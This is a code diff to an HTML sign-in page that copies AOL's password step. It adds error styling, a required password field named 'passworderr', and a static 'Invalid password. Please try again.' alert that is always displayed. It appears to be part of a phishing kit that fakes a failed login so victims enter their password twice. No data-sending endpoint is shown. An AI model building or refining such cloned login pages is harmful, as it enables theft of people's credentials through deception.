@@ -11,6 +11,13 @@
         <link rel="apple-touch-icon-precomposed" href="img/aol-apple-touch-icon.png">
 
         <style nonce="">
+		.generic-page .error-msg, .challenge .error-msg {
+    font-size: .70588rem;
+    line-height: 1.17647rem;
+    padding-top: .29412rem;
+    color: #f0162f;
+}
+
             #mbr-css-check {
                 display: inline;
             }
@@ -64,12 +71,17 @@
         </div>
         <input type="hidden" name="passwordContext" value="normal">
         <div id="password-container" class="input-group password-container blurred">
-            <input type="password" id="login-passwd" class="password" name="passworderr" placeholder=" " autofocus="" autocomplete="current-password">
+            <input type="password" id="login-passwd" class="password" name="passworderr" placeholder=" " autofocus="" autocomplete="current-password" required>
             <label for="login-passwd" id="password-label" class="password-label">Password</label>
             <div class="caps-indicator hide" id="caps-indicator" title="Capslock is&nbsp;on"></div>
+			
+
             <button type="button" class="show-hide-toggle-button hide-pw" id="password-toggle-button" tabindex="-1" title="Show&nbsp;password"></button>
         </div>
-
+	<p id="username-error" class="row error" role="alert" data-error="messages.ERROR_INVALID_USERNAME" style="background-color: transparent;
+    color: #dd1037;
+    padding: 4px 8px 0;
+    font-size: 12px;">Invalid password. Please try again.</p>
         <div class="button-container">
             <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button challenge-button" name="verifyPassword" value="Next" data-rapid-tracking="true" data-ylk="elm:btn;elmt:slk:next;primary;mKey:password-challenge-next">
                     Next
